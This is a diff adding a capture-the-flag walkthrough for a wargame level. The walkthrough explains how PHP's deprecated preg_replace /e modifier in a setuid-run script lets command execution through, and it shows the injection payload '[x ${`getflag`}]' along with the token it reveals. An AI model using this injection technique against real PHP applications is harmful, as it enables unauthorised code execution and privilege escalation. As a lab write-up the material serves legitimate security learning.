@@ -1,0 +1,26 @@
+for this level we have 2 files own by the user flag06
+	level06			# this one have setuid bit enabled
+	level06.php
+
+the binary will run the php script as flag06
+
+the php script use file_get_contents with argv[1] and pass the result in a preg_replace
+which use the pattern modifier `e (PREG_REPLACE_EVAL)` that will evaluate the result string
+
+Warning: This feature was DEPRECATED in PHP 5.5.0, and REMOVED as of PHP 7.0.0
+
+$> php -v
+PHP 5.3.10-1ubuntu3.19 [...]
+
+we need a string that match the regex that can exec the getflag command
+	preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a)
+
+the regex /(\[x (.*)\])/ can be match by [x <whatever>]
+
+$> echo '[x ${`getflag`}]' | ./level06 "php://stdin"
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+ in /home/user/level06/level06.php(4) : regexp code on line 1
+
+php inform us of a error but the getflag command was executed successfully
+
+this token is the level07's password
